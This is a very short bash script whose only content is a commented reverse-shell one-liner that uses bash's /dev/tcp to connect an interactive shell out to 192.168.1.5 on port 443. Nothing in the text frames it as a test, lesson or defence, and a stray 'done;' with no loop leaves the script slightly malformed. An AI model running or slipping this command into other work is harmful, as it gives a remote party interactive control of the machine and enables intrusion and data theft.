#!/usr/bin/env bash

#Reverse shell by calling bash command directly and tcp out with details and port.
bash -i >& /dev/tcp/192.168.1.5/443 0>&1  ;

done;
